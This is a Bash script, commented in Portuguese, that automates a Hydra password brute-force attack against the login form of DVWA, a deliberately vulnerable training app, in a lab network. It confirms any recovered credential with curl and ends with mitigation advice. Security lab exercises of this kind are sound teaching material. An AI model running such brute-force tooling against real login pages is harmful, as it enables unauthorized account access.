#!/bin/bash

##############################################################################
# Script: Test DVWA Web Form Brute Force Attack
# Descrição: Automatiza teste de força bruta em DVWA
# Uso: ./test-dvwa.sh <IP_ALVO> [USERNAME]
##############################################################################

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Variáveis
TARGET_IP="${1:-192.168.56.3}"
USERNAME="${2:-admin}"
WORDLIST="../wordlists/web-passwords.txt"
LOG_DIR="../logs"
LOG_FILE="$LOG_DIR/dvwa-test-$(date +%Y%m%d-%H%M%S).log"
DVWA_URL="http://$TARGET_IP/dvwa/login.php"

# Banner
echo -e "${BLUE}"
echo "╔════════════════════════════════════════════════════════════╗"
echo "║      DVWA WEB FORM BRUTE FORCE - AMBIENTE CONTROLADO       ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Verificações iniciais
echo -e "${YELLOW}[*] Verificando pré-requisitos...${NC}"

mkdir -p "$LOG_DIR"

# Verificar Hydra
if ! command -v hydra &> /dev/null; then
    echo -e "${RED}[✗] Hydra não encontrado!${NC}"
    echo "    Instale com: sudo apt install hydra"
    exit 1
fi
echo -e "${GREEN}[✓] Hydra instalado${NC}"

# Verificar wordlist
if [ ! -f "$WORDLIST" ]; then
    echo -e "${RED}[✗] Wordlist não encontrada: $WORDLIST${NC}"
    exit 1
fi
WORDLIST_SIZE=$(wc -l < "$WORDLIST")
echo -e "${GREEN}[✓] Wordlist encontrada ($WORDLIST_SIZE senhas)${NC}"

# Verificar conectividade
echo -e "\n${YELLOW}[*] Verificando conectividade...${NC}"
if ! ping -c 2 -W 2 "$TARGET_IP" &> /dev/null; then
    echo -e "${RED}[✗] Não foi possível alcançar $TARGET_IP${NC}"
    exit 1
fi
echo -e "${GREEN}[✓] Alvo acessível${NC}"

# Verificar DVWA
echo -e "\n${YELLOW}[*] Verificando DVWA...${NC}"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$DVWA_URL")
if [[ "$HTTP_CODE" =~ ^(200|302)$ ]]; then
    echo -e "${GREEN}[✓] DVWA acessível em $DVWA_URL${NC}"
else
    echo -e "${RED}[✗] DVWA não acessível (HTTP $HTTP_CODE)${NC}"
    exit 1
fi

# Detectar formulário
echo -e "\n${YELLOW}[*] Analisando formulário de login...${NC}"
FORM_DATA=$(curl -s "$DVWA_URL")

if echo "$FORM_DATA" | grep -q "name=\"username\""; then
    echo -e "${GREEN}[✓] Campo 'username' encontrado${NC}"
else
    echo -e "${RED}[!] Campo 'username' não encontrado${NC}"
fi

if echo "$FORM_DATA" | grep -q "name=\"password\""; then
    echo -e "${GREEN}[✓] Campo 'password' encontrado${NC}"
else
    echo -e "${RED}[!] Campo 'password' não encontrado${NC}"
fi

# Parâmetros do teste
echo -e "\n${YELLOW}════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}Parâmetros do Teste:${NC}"
echo -e "  URL.........: ${GREEN}$DVWA_URL${NC}"
echo -e "  Usuário.....: ${GREEN}$USERNAME${NC}"
echo -e "  Wordlist....: ${GREEN}$WORDLIST${NC}"
echo -e "  Senhas......: ${GREEN}$WORDLIST_SIZE${NC}"
echo -e "  Log.........: ${GREEN}$LOG_FILE${NC}"
echo -e "${YELLOW}════════════════════════════════════════════════════════════${NC}"

read -p "Deseja continuar? (s/N): " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Ss]$ ]]; then
    echo -e "${RED}[!] Teste cancelado${NC}"
    exit 0
fi

# Executar ataque
echo -e "\n${BLUE}[*] Iniciando ataque de força bruta com Hydra...${NC}"
echo -e "${YELLOW}    Aguarde, isso pode levar alguns minutos...${NC}\n"

START_TIME=$(date +%s)

# Executar Hydra
hydra -l "$USERNAME" -P "$WORDLIST" \
    "$TARGET_IP" \
    http-post-form \
    "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
    -t 4 -V 2>&1 | tee "$LOG_FILE"

END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))

# Analisar resultados
echo -e "\n${YELLOW}════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}[*] Análise de Resultados:${NC}"

if grep -q "password:" "$LOG_FILE"; then
    PASSWORD=$(grep "password:" "$LOG_FILE" | tail -1 | awk '{print $NF}')
    echo -e "${GREEN}[✓] CREDENCIAL ENCONTRADA!${NC}"
    echo -e "    Usuário...: ${GREEN}$USERNAME${NC}"
    echo -e "    Senha.....: ${GREEN}$PASSWORD${NC}"
    echo -e "    Tempo.....: ${GREEN}${DURATION}s${NC}"
    
    # Tentar login
    echo -e "\n${YELLOW}[*] Validando acesso via curl...${NC}"
    RESPONSE=$(curl -s -c cookies.txt -b cookies.txt \
        -d "username=$USERNAME&password=$PASSWORD&Login=Login" \
        "$DVWA_URL" -L)
    
    if echo "$RESPONSE" | grep -q "Logout"; then
        echo -e "${GREEN}[✓] Login bem-sucedido! Sessão criada${NC}"
        rm -f cookies.txt
    else
        echo -e "${RED}[!] Não foi possível validar o login${NC}"
    fi
else
    echo -e "${RED}[✗] Nenhuma credencial encontrada${NC}"
    echo -e "    Tempo.....: ${DURATION}s"
fi

echo -e "${YELLOW}════════════════════════════════════════════════════════════${NC}"

# Estatísticas
echo -e "\n${BLUE}[*] Estatísticas do Teste:${NC}"
TOTAL_ATTEMPTS=$(grep -c "\[http-post-form\]" "$LOG_FILE" 2>/dev/null || echo "$WORDLIST_SIZE")
echo -e "    Total de tentativas: $TOTAL_ATTEMPTS"
if [ $DURATION -gt 0 ]; then
    echo -e "    Taxa: $((TOTAL_ATTEMPTS / DURATION)) tentativas/segundo"
fi

# Recomendações
echo -e "\n${BLUE}[*] Recomendações de Mitigação para Aplicações Web:${NC}"
echo -e "    1. Implementar CAPTCHA após 3 tentativas falhas"
echo -e "    2. Rate limiting: máximo 5 tentativas por minuto por IP"
echo -e "    3. Bloqueio progressivo: 5 min, 15 min, 1 hora, etc."
echo -e "    4. Autenticação multifator (2FA/MFA)"
echo -e "    5. Monitorar padrões de tentativas de login"
echo -e "    6. Usar tokens CSRF para proteger formulários"
echo -e "    7. Implementar Web Application Firewall (WAF)"
echo -e "    8. Logs detalhados de tentativas de autenticação"

echo -e "\n${GREEN}[✓] Teste concluído! Log salvo em: $LOG_FILE${NC}\n"
